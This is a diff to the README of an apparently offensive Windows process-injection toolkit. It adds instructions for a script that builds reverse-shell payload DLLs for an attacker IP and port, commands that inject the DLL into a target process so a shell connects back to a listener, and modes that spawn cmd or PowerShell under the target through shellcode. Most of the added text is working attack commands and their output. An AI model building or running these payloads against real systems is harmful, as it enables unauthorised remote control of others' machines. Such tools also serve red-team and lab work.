@@ -12,6 +12,10 @@ process-injection-2/
 ├── pop_x64.exe                    --dll / --spawn / --msg / --list modes.
 ├── pop_x86.exe                    colored output; arch-mismatch auto-switch.
 │
+├── build_revshell_dll.sh       Linux interactive cross-compiler for the DLL:
+│                               prompts LHOST/LPORT, menu picks arch
+│                               (x64/x86/ARM64/all), writes revshell_<arch>.dll.
+│
 └── reverse-shell/              reverse-shell payload DLL
     ├── revshell_pure_dll.cpp   DLL — copies cmd.exe next to the host EXE,
     ├── revshell_pure_dll.dll   patches FileDescription, spawns renamed copy
@@ -36,7 +40,44 @@ Edit these, rebuild the DLL.
 
 ---
 
-## Build the DLL — one-liner per architecture
+## Build the DLL
+
+### Easiest — the interactive script (Linux)
+
+```bash
+chmod +x build_revshell_dll.sh
+./build_revshell_dll.sh
+```
+
+The script:
+
+- prompts for **LHOST** and **LPORT** (defaults `10.10.14.1` / `4444`; remembers your last answers in `build_revshell_dll.conf` next to the script)
+- shows an **arch menu**: `1) x64  2) x86  3) ARM64  4) all`
+- installs `mingw-w64` with `sudo apt` if missing (ARM64 prints a one-line hint for `llvm-mingw`)
+- writes `reverse-shell/revshell_<arch>.dll`
+- **never modifies the committed `.cpp`** — substitution happens on a temp copy
+
+Sample run:
+
+```
+[+] source : ./reverse-shell/revshell_pure_dll.cpp
+[+] output : ./reverse-shell/revshell_<arch>.dll
+? LHOST (attacker IP) [10.10.14.1]: 192.168.1.50
+? LPORT (listener port) [4444]:
+Pick architecture:
+  1)  x64    (AMD64 — 99% of modern Windows targets)
+  2)  x86    (32-bit / WOW64 — legacy apps)
+  3)  ARM64  (Surface Pro X, newer ARM laptops)
+  4)  all three
+? choice [1]: 4
+
+[+] building  x64   -> ./reverse-shell/revshell_x64.dll     ok  136704 bytes
+[+] building  x86   -> ./reverse-shell/revshell_x86.dll     ok  113664 bytes
+[+] building  arm64 -> ./reverse-shell/revshell_arm64.dll   ok  142848 bytes
+[+] done  (settings saved to ./build_revshell_dll.conf)
+```
+
+### Manual — one-liner per architecture
 
 Pick the arch that **matches the target process**, not the injector. `pop.exe` prints the target's arch in its `[+] target` block at runtime.
 
@@ -136,6 +177,29 @@ pop_x64.exe <PID_or_name> --dll revshell_pure_dll.dll
 Shell lands on your listener. Child process appears under the target as `RevShell - WinCmd Proc` (big text in Task Manager Processes tab) with image name `revShell.exe` — identifiable at a glance.
 
 ---
+
+## Other modes — spawn a small app as a child of the target
+
+Useful for PoC screenshots / demos (parent-child tree in Task Manager is the "proof"):
+
+```powershell
+pop_x64.exe <target> --spawn calc.exe             # spawn Calculator
+pop_x64.exe <target> --spawn notepad.exe          # spawn Notepad
+pop_x64.exe <target> --spawn mspaint.exe          # spawn Paint
+pop_x64.exe <target> --spawn cmd.exe              # spawn cmd window
+pop_x64.exe <target> --spawn powershell.exe       # spawn PowerShell
+pop_x64.exe <target> --spawn "cmd /k whoami"      # spawn cmd running whoami
+pop_x64.exe <target> --spawn "cmd /k systeminfo"  # spawn cmd running systeminfo
+```
+
+Same syntax for `pop_x86.exe` against x86 targets. The spawn chain is pure shellcode (`WinExec`), so no DLL is required and arch-mismatch rules don't apply here — any program in `PATH` works.
+
+## MessageBox mode — visible banner inside the target
+
+```powershell
+pop_x64.exe explorer "I was here"
+pop_x64.exe 1234 "PWNED by m14r41"
+```
 
 ## Example output
 
